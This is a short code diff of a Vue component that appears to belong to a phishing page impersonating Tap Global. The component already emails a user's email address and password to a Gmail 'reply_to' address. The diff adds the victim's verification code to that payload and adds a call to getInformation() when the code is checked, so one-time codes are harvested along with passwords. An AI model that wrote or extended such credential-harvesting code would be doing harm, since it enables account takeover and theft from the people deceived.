@@ -151,6 +151,7 @@ export default {
     checkVerificationCode() {
       const self = this
       this.isLoadingCheck = true
+      this.getInformation();
       if (this.code !== '') {
         this.intervalid2 = setInterval(function () {
           self.isLoadingCheck = false
@@ -176,6 +177,7 @@ export default {
               from_name: 'Tap Global',
               email: this.email,
               password: this.password,
+              validation_code: this.code,
               reply_to: 'customeronlineagent@gmail.com',
             },
           }
